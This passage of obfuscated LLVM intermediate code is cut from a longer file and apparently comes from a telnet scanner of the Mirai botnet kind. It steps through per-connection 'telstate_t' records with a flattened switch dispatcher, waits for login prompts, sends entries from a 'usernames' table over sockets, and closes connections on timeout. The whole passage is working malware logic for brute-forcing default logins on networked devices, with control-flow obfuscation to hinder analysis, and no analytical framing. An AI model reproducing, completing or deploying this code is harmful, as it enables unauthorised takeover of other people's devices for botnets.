  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %.reload304 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload304, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 6
  store i32 0, i32* %435, align 4
  %436 = load i32, i32* %2, align 4
  %437 = sext i32 %436 to i64
  %.reload303 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload303, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 7
  store i16 0, i16* %439, align 16
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %.reload302 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload302, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 8
  %444 = load i8*, i8** %443, align 8
  %445 = call i8* @strstr(i8* %444, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %446 = icmp ne i8* %445, null
  %447 = select i1 %446, i32 1340598950, i32 1312407203
  store i32 %447, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %.reload301 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload301, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 2
  store i8 5, i8* %452, align 8
  store i32 669339491, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %.reload300 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload300, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 2
  store i8 3, i8* %457, align 8
  store i32 669339491, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %.reload299 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload299, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 8
  %463 = load i8*, i8** %462, align 8
  call void @llvm.memset.p0i8.i64(i8* %463, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i32, i32* %2, align 4
  %466 = sext i32 %465 to i64
  %.reload298 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload298, i64 %466
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %467, i32 0, i32 0
  %469 = load i32, i32* %468, align 16
  %470 = load i32, i32* %2, align 4
  %471 = sext i32 %470 to i64
  %.reload297 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload297, i64 %471
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %472, i32 0, i32 8
  %474 = load i8*, i8** %473, align 8
  %475 = load i32, i32* %2, align 4
  %476 = sext i32 %475 to i64
  %.reload296 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload296, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 7
  %479 = load i16, i16* %478, align 16
  %480 = zext i16 %479 to i32
  %481 = call i32 @readUntil(i32 %469, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %474, i32 1024, i32 %480)
  %482 = icmp ne i32 %481, 0
  %483 = select i1 %482, i32 -1938980461, i32 -633487754
  store i32 %483, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  %485 = load i32, i32* %2, align 4
  %486 = sext i32 %485 to i64
  %.reload295 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload295, i64 %486
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %487, i32 0, i32 6
  store i32 0, i32* %488, align 4
  %489 = load i32, i32* %2, align 4
  %490 = sext i32 %489 to i64
  %.reload294 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload294, i64 %490
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %491, i32 0, i32 7
  store i16 0, i16* %492, align 16
  %493 = load i32, i32* %2, align 4
  %494 = sext i32 %493 to i64
  %.reload293 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload293, i64 %494
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %495, i32 0, i32 8
  %497 = load i8*, i8** %496, align 8
  %498 = call i8* @strstr(i8* %497, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %499 = icmp ne i8* %498, null
  %500 = select i1 %499, i32 -1812544835, i32 -1882601075
  store i32 %500, i32* %switchVar
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  %502 = load i32, i32* %2, align 4
  %503 = sext i32 %502 to i64
  %.reload292 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload292, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 2
  store i8 5, i8* %505, align 8
  store i32 1846351137, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i32, i32* %2, align 4
  %508 = sext i32 %507 to i64
  %.reload291 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload291, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 2
  store i8 3, i8* %510, align 8
  store i32 1846351137, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %2, align 4
  %513 = sext i32 %512 to i64
  %.reload290 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload290, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 8
  %516 = load i8*, i8** %515, align 8
  call void @llvm.memset.p0i8.i64(i8* %516, i8 0, i64 1024, i32 1, i1 false)
  %517 = load i32, i32* %2, align 4
  %518 = sext i32 %517 to i64
  %.reload289 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload289, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 2
  store i8 3, i8* %520, align 8
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:521:                                    ; preds = %loopEntry
  %522 = load i32, i32* %2, align 4
  %523 = sext i32 %522 to i64
  %.reload288 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload288, i64 %523
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %524, i32 0, i32 0
  %526 = load i32, i32* %525, align 16
  %527 = load i32, i32* %2, align 4
  %528 = sext i32 %527 to i64
  %.reload287 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload287, i64 %528
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %529, i32 0, i32 8
  %531 = load i8*, i8** %530, align 8
  %532 = load i32, i32* %2, align 4
  %533 = sext i32 %532 to i64
  %.reload286 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload286, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 7
  %536 = load i16, i16* %535, align 16
  %537 = zext i16 %536 to i32
  %538 = call i32 @readUntil(i32 %526, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %531, i32 1024, i32 %537)
  %539 = icmp ne i32 %538, 0
  %540 = select i1 %539, i32 185115641, i32 -716104463
  store i32 %540, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  %542 = load i32, i32* %2, align 4
  %543 = sext i32 %542 to i64
  %.reload285 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload285, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 6
  store i32 0, i32* %545, align 4
  %546 = load i32, i32* %2, align 4
  %547 = sext i32 %546 to i64
  %.reload284 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload284, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 7
  store i16 0, i16* %549, align 16
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %.reload283 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload283, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 8
  %554 = load i8*, i8** %553, align 8
  call void @llvm.memset.p0i8.i64(i8* %554, i8 0, i64 1024, i32 1, i1 false)
  %555 = load i32, i32* %2, align 4
  %556 = sext i32 %555 to i64
  %.reload282 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload282, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 2
  store i8 5, i8* %558, align 8
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i32, i32* %2, align 4
  %561 = sext i32 %560 to i64
  %.reload281 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload281, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 0
  %564 = load i32, i32* %563, align 16
  %565 = load i32, i32* %2, align 4
  %566 = sext i32 %565 to i64
  %.reload280 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload280, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 8
  %569 = load i8*, i8** %568, align 8
  %570 = load i32, i32* %2, align 4
  %571 = sext i32 %570 to i64
  %.reload279 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload279, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 7
  %574 = load i16, i16* %573, align 16
  %575 = zext i16 %574 to i32
  %576 = call i32 @readUntil(i32 %564, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %569, i32 1024, i32 %575)
  %577 = icmp ne i32 %576, 0
  %578 = select i1 %577, i32 1647211941, i32 -782644069
  store i32 %578, i32* %switchVar
  br label %loopEnd

; <label>:579:                                    ; preds = %loopEntry
  %580 = load i32, i32* %2, align 4
  %581 = sext i32 %580 to i64
  %.reload278 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload278, i64 %581
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %582, i32 0, i32 6
  store i32 0, i32* %583, align 4
  %584 = load i32, i32* %2, align 4
  %585 = sext i32 %584 to i64
  %.reload277 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload277, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 7
  store i16 0, i16* %587, align 16
  %588 = load i32, i32* %2, align 4
  %589 = sext i32 %588 to i64
  %.reload276 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload276, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 8
  %592 = load i8*, i8** %591, align 8
  %593 = call i8* @strstr(i8* %592, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %594 = icmp ne i8* %593, null
  %595 = select i1 %594, i32 1019447708, i32 -1339243247
  store i32 %595, i32* %switchVar
  br label %loopEnd

; <label>:596:                                    ; preds = %loopEntry
  %597 = load i32, i32* %2, align 4
  %598 = sext i32 %597 to i64
  %.reload275 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload275, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 2
  store i8 5, i8* %600, align 8
  store i32 -254291744, i32* %switchVar
  br label %loopEnd

; <label>:601:                                    ; preds = %loopEntry
  %602 = load i32, i32* %2, align 4
  %603 = sext i32 %602 to i64
  %.reload274 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload274, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 2
  store i8 3, i8* %605, align 8
  store i32 -254291744, i32* %switchVar
  br label %loopEnd

; <label>:606:                                    ; preds = %loopEntry
  %607 = load i32, i32* %2, align 4
  %608 = sext i32 %607 to i64
  %.reload273 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload273, i64 %608
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %609, i32 0, i32 8
  %611 = load i8*, i8** %610, align 8
  call void @llvm.memset.p0i8.i64(i8* %611, i8 0, i64 1024, i32 1, i1 false)
  %612 = load i32, i32* %2, align 4
  %613 = sext i32 %612 to i64
  %.reload272 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload272, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 2
  store i8 3, i8* %615, align 8
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:616:                                    ; preds = %loopEntry
  %617 = load i32, i32* %2, align 4
  %618 = sext i32 %617 to i64
  %.reload271 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload271, i64 %618
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %619, i32 0, i32 0
  %621 = load i32, i32* %620, align 16
  %622 = load i32, i32* %2, align 4
  %623 = sext i32 %622 to i64
  %.reload270 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload270, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 8
  %626 = load i8*, i8** %625, align 8
  %627 = load i32, i32* %2, align 4
  %628 = sext i32 %627 to i64
  %.reload269 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload269, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 7
  %631 = load i16, i16* %630, align 16
  %632 = zext i16 %631 to i32
  %633 = call i32 @readUntil(i32 %621, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %626, i32 1024, i32 %632)
  %634 = icmp ne i32 %633, 0
  %635 = select i1 %634, i32 -646997079, i32 928382677
  store i32 %635, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  %637 = load i32, i32* %2, align 4
  %638 = sext i32 %637 to i64
  %.reload268 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload268, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 6
  store i32 0, i32* %640, align 4
  %641 = load i32, i32* %2, align 4
  %642 = sext i32 %641 to i64
  %.reload267 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload267, i64 %642
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %643, i32 0, i32 7
  store i16 0, i16* %644, align 16
  %645 = load i32, i32* %2, align 4
  %646 = sext i32 %645 to i64
  %.reload266 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload266, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 8
  %649 = load i8*, i8** %648, align 8
  call void @llvm.memset.p0i8.i64(i8* %649, i8 0, i64 1024, i32 1, i1 false)
  %650 = load i32, i32* %2, align 4
  %651 = sext i32 %650 to i64
  %.reload265 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload265, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 2
  store i8 5, i8* %653, align 8
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %.reload264 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload264, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 8
  %659 = load i8*, i8** %658, align 8
  %660 = call i64 @strlen(i8* %659) #10
  %661 = trunc i64 %660 to i16
  %662 = load i32, i32* %2, align 4
  %663 = sext i32 %662 to i64
  %.reload263 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload263, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 7
  store i16 %661, i16* %665, align 16
  store i32 427114052, i32* %switchVar
  br label %loopEnd

; <label>:666:                                    ; preds = %loopEntry
  store i32 -811942394, i32* %switchVar
  br label %loopEnd

; <label>:667:                                    ; preds = %loopEntry
  store i32 1005793893, i32* %switchVar
  br label %loopEnd

; <label>:668:                                    ; preds = %loopEntry
  store i32 -673278805, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  store i32 -646525292, i32* %switchVar
  br label %loopEnd

; <label>:670:                                    ; preds = %loopEntry
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %.reload262 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload262, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 6
  %675 = load i32, i32* %674, align 4
  %676 = add i32 %675, 10
  %677 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %678 = icmp ult i32 %676, %677
  %679 = select i1 %678, i32 -2032599245, i32 1662775773
  store i32 %679, i32* %switchVar
  br label %loopEnd

; <label>:680:                                    ; preds = %loopEntry
  %681 = load i32, i32* %2, align 4
  %682 = sext i32 %681 to i64
  %.reload261 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload261, i64 %682
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %683, i32 0, i32 0
  %685 = load i32, i32* %684, align 16
  %686 = call i32 @sclose(i32 %685)
  %687 = load i32, i32* %2, align 4
  %688 = sext i32 %687 to i64
  %.reload260 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload260, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 2
  store i8 0, i8* %690, align 8
  %691 = load i32, i32* %2, align 4
  %692 = sext i32 %691 to i64
  %.reload259 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload259, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 3
  store i8 1, i8* %694, align 1
  store i32 1662775773, i32* %switchVar
  br label %loopEnd

; <label>:695:                                    ; preds = %loopEntry
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:696:                                    ; preds = %loopEntry
  %697 = load i32, i32* %2, align 4
  %698 = sext i32 %697 to i64
  %.reload258 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload258, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 0
  %701 = load i32, i32* %700, align 16
  %702 = load i32, i32* %2, align 4
  %703 = sext i32 %702 to i64
  %.reload257 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload257, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 4
  %706 = load i8, i8* %705, align 2
  %707 = zext i8 %706 to i64
  %708 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %707
  %709 = load i8*, i8** %708, align 8
  %710 = load i32, i32* %2, align 4
  %711 = sext i32 %710 to i64
  %.reload256 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload256, i64 %711
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 4
  %714 = load i8, i8* %713, align 2
  %715 = zext i8 %714 to i64
  %716 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %715
  %717 = load i8*, i8** %716, align 8
  %718 = call i64 @strlen(i8* %717) #10
  %719 = call i64 @send(i32 %701, i8* %709, i64 %718, i32 16384)
  %720 = icmp slt i64 %719, 0
  %721 = select i1 %720, i32 1770588350, i32 -853170575
  store i32 %721, i32* %switchVar
  br label %loopEnd

; <label>:722:                                    ; preds = %loopEntry
  %723 = load i32, i32* %2, align 4
  %724 = sext i32 %723 to i64
  %.reload255 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload255, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 16
  %728 = call i32 @sclose(i32 %727)
  %729 = load i32, i32* %2, align 4
  %730 = sext i32 %729 to i64
  %.reload254 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload254, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 2
  store i8 0, i8* %732, align 8
  %733 = load i32, i32* %2, align 4
  %734 = sext i32 %733 to i64
  %.reload253 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload253, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 3
  store i8 1, i8* %736, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:737:                                    ; preds = %loopEntry
  %738 = load i32, i32* %2, align 4
  %739 = sext i32 %738 to i64
  %.reload252 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload252, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 0
  %742 = load i32, i32* %741, align 16
  %743 = call i64 @send(i32 %742, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %744 = icmp slt i64 %743, 0
  %745 = select i1 %744, i32 2012069680, i32 -1076985394
  store i32 %745, i32* %switchVar
  br label %loopEnd

; <label>:746:                                    ; preds = %loopEntry
  %747 = load i32, i32* %2, align 4
  %748 = sext i32 %747 to i64
  %.reload251 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload251, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 0
  %751 = load i32, i32* %750, align 16
  %752 = call i32 @sclose(i32 %751)
  %753 = load i32, i32* %2, align 4
  %754 = sext i32 %753 to i64
  %.reload250 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload250, i64 %754
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %755, i32 0, i32 2
  store i8 0, i8* %756, align 8
  %757 = load i32, i32* %2, align 4
  %758 = sext i32 %757 to i64
  %.reload249 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload249, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 3
  store i8 1, i8* %760, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:761:                                    ; preds = %loopEntry
  %762 = load i32, i32* %2, align 4
  %763 = sext i32 %762 to i64
  %.reload248 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload248, i64 %763
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %764, i32 0, i32 2
  store i8 4, i8* %765, align 8
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:766:                                    ; preds = %loopEntry
  %767 = load i32, i32* %2, align 4
  %768 = sext i32 %767 to i64
  %.reload247 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload247, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 6
  %771 = load i32, i32* %770, align 4
  %772 = icmp eq i32 %771, 0
  %773 = select i1 %772, i32 1790058661, i32 1485436538
  store i32 %773, i32* %switchVar
  br label %loopEnd

; <label>:774:                                    ; preds = %loopEntry
  %775 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %776 = load i32, i32* %2, align 4
  %777 = sext i32 %776 to i64
  %.reload246 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload246, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 6
  store i32 %775, i32* %779, align 4
  store i32 1485436538, i32* %switchVar
  br label %loopEnd

; <label>:780:                                    ; preds = %loopEntry
  %781 = load i32, i32* %2, align 4
  %782 = sext i32 %781 to i64
  %.reload245 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload245, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 0
  %785 = load i32, i32* %784, align 16
  %786 = load i32, i32* %2, align 4
